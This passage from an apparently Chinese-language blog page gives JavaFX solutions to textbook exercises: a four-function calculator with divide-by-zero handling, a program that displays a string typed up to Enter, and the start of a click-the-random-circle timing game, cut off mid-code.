<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span><span class="token class-name">Text</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Caculator</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">HBox</span> hBox1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HBox</span> hBox2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Text</span> text <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Text</span><span class="token punctuation">(</span><span class="token string">"Divisor cannot be 0!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        text<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">RED</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">BorderPane</span> borderPane <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BorderPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Button</span> addBtn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Add"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Button</span> subtractBtn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Subtract"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Button</span> multiplyBtn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Multiply"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Button</span> divideBtn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Divide"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Text</span> num1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Text</span><span class="token punctuation">(</span><span class="token string">"Number 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TextField</span> num1Field <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Text</span> num2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Text</span><span class="token punctuation">(</span><span class="token string">"Number 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TextField</span> num2Field <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Text</span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Text</span><span class="token punctuation">(</span><span class="token string">"Result"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TextField</span> resultField <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        resultField<span class="token punctuation">.</span><span class="token function">setEditable</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hBox1<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>num1<span class="token punctuation">,</span> num1Field<span class="token punctuation">,</span> num2<span class="token punctuation">,</span> num2Field<span class="token punctuation">,</span> result<span class="token punctuation">,</span> resultField<span class="token punctuation">)</span><span class="token punctuation">;</span>
        hBox1<span class="token punctuation">.</span><span class="token function">setSpacing</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hBox1<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        hBox2<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>addBtn<span class="token punctuation">,</span> subtractBtn<span class="token punctuation">,</span> multiplyBtn<span class="token punctuation">,</span> divideBtn<span class="token punctuation">)</span><span class="token punctuation">;</span>
        hBox2<span class="token punctuation">.</span><span class="token function">setSpacing</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hBox2<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        addBtn<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            borderPane<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">double</span> num1Value <span class="token operator">=</span> <span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token function">parseDouble</span><span class="token punctuation">(</span>num1Field<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">double</span> num2Value <span class="token operator">=</span> <span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token function">parseDouble</span><span class="token punctuation">(</span>num2Field<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">double</span> resultValue <span class="token operator">=</span> num1Value <span class="token operator">+</span> num2Value<span class="token punctuation">;</span>
            resultField<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">""</span> <span class="token operator">+</span> resultValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        subtractBtn<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            borderPane<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">double</span> num1Value <span class="token operator">=</span> <span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token function">parseDouble</span><span class="token punctuation">(</span>num1Field<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">double</span> num2Value <span class="token operator">=</span> <span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token function">parseDouble</span><span class="token punctuation">(</span>num2Field<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">double</span> resultValue <span class="token operator">=</span> num1Value <span class="token operator">-</span> num2Value<span class="token punctuation">;</span>
            resultField<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">""</span> <span class="token operator">+</span> resultValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        multiplyBtn<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            borderPane<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">double</span> num1Value <span class="token operator">=</span> <span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token function">parseDouble</span><span class="token punctuation">(</span>num1Field<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">double</span> num2Value <span class="token operator">=</span> <span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token function">parseDouble</span><span class="token punctuation">(</span>num2Field<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">double</span> resultValue <span class="token operator">=</span> num1Value <span class="token operator">*</span> num2Value<span class="token punctuation">;</span>
            resultField<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">""</span> <span class="token operator">+</span> resultValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        divideBtn<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            borderPane<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">double</span> num1Value <span class="token operator">=</span> <span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token function">parseDouble</span><span class="token punctuation">(</span>num1Field<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">double</span> num2Value <span class="token operator">=</span> <span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token function">parseDouble</span><span class="token punctuation">(</span>num2Field<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>num2Value <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                borderPane<span class="token punctuation">.</span><span class="token function">setTop</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>
                resultField<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">BorderPane</span><span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> <span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">double</span> resultValue <span class="token operator">=</span> num1Value <span class="token operator">/</span> num2Value<span class="token punctuation">;</span>
            resultField<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">""</span> <span class="token operator">+</span> resultValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        borderPane<span class="token punctuation">.</span><span class="token function">setCenter</span><span class="token punctuation">(</span>hBox1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        borderPane<span class="token punctuation">.</span><span class="token function">setBottom</span><span class="token punctuation">(</span>hBox2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>borderPane<span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"Caculator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/images/posts/piZpgOS.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/10/26/piZpgOS.png'">
<h2 id="输入并显示字符串请编写一个程序从键盘接收一个字符串并把它显示在面板上-回车键表明字符串结束-任何时候输人一个新字符串时都会将它显示在面板上"><a class="markdownIt-Anchor" href="#输入并显示字符串请编写一个程序从键盘接收一个字符串并把它显示在面板上-回车键表明字符串结束-任何时候输人一个新字符串时都会将它显示在面板上"></a> (输入并显示字符串)请编写一个程序，从键盘接收一个字符串并把它显示在面板上。回车键表明字符串结束。任何时候输人一个新字符串时都会将它显示在面板上</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>geometry<span class="token punctuation">.</span></span><span class="token class-name">Pos</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">TextField</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">GridPane</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">HBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">StackPane</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span><span class="token class-name">Text</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StringDisplay</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>

    <span class="token class-name">StringBuilder</span> stringBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 用于存储输入的字符串</span>
    <span class="token class-name">Text</span> displayText <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 用于显示字符串的Text节点</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">GridPane</span> root <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GridPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">TextField</span> textField <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 添加键盘事件处理器</span>
        textField<span class="token punctuation">.</span><span class="token function">setOnKeyTyped</span><span class="token punctuation">(</span>event <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span><span class="token function">getCharacter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">'\r'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 检查是否按下回车键</span>
                displayText<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span>stringBuilder<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 更新Text节点的内容</span>
                stringBuilder<span class="token punctuation">.</span><span class="token function">setLength</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 清空StringBuilder</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                stringBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span><span class="token function">getCharacter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 添加字符到StringBuilder</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">HBox</span> hbox1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HBox</span> hbox2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        hbox1<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hbox1<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>textField<span class="token punctuation">)</span><span class="token punctuation">;</span>
        hbox2<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hbox2<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>displayText<span class="token punctuation">)</span><span class="token punctuation">;</span>
        root<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>hbox1<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 添加Text节点到面板</span>
        root<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>hbox2<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 添加TextField到面板</span>
        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"Display String"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/images/posts/piZp6Qf.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/10/26/piZp6Qf.png'">
<h2 id="游戏手眼协调请编写一个程序显示一个半径为10-像素的实心圆该圆放置在面板上的随机位置并填充随机的顔色如图15-29b所示-单击这个圆时它会消失然后在另一个随机的位置显示新的随机颜色的圆-在单击了20-个圆之后在面板上显示所用的时间"><a class="markdownIt-Anchor" href="#游戏手眼协调请编写一个程序显示一个半径为10-像素的实心圆该圆放置在面板上的随机位置并填充随机的顔色如图15-29b所示-单击这个圆时它会消失然后在另一个随机的位置显示新的随机颜色的圆-在单击了20-个圆之后在面板上显示所用的时间"></a> (游戏：手眼协调)请编写一个程序，显示一个半径为10 像素的实心圆，该圆放置在面板上的随机位置，并填充随机的顔色，如图15-29b所示。单击这个圆时，它会消失，然后在另一个随机的位置显示新的随机颜色的圆。在单击了20 个圆之后，在面板上显示所用的时间</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Random</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">Pane</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>paint<span class="token punctuation">.</span></span><span class="token class-name">Color</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">Circle</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RandomCircle</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span><span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token keyword">int</span> clickCount <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 单击计数器</span>
    <span class="token keyword">private</span> <span class="token keyword">long</span> startTime<span class="token punctuation">;</span> <span class="token comment">// 记录开始时间</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Pane</span> pane <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        startTime <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 记录开始时间</span>

        <span class="token comment">// 初始化圆</span>
        <span class="token class-name">Circle</span> circle <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Circle</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setPositionAndColor</span><span class="token punctuation">(</span>circle<span class="token punctuation">)</span><span class="token punctuation">;</span>
        pane<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>circle<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 注册单击事件</span>
        circle<span class="token punctuation">.</span><span class="token function">setOnMouseClicked</span><span class="token punctuation">(</span>event <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            clickCount<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// 单击计数器加一</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span>clickCount <span class="token operator">&lt;</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// 设置新的位置和颜色</span>
                <span class="token function">setPositionAndColor</span><span class="token punctuation">(</span>circle<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">long</span> endTime <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 记录结束时间</span>
                <span class="token keyword">long</span> elapsedTime <span class="token operator">=</span> <span class="token punctuation">(</span>endTime <span class="token operator">-</span> startTime<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 计算所用时间（毫秒）</span>

                <span class="token comment">// 显示所用时间</span>
                pane<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">// 注意：这里简单地使用了JavaFX的Text组件，更多功能可根据需求添加</span>
                <span class="token class-name"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span>Text</span> text <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span>Text</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">"Time: "</span> <span class="token operator">+</span> elapsedTime <span class="token operator">+</span> <span class="token string">"ms"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                pane<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
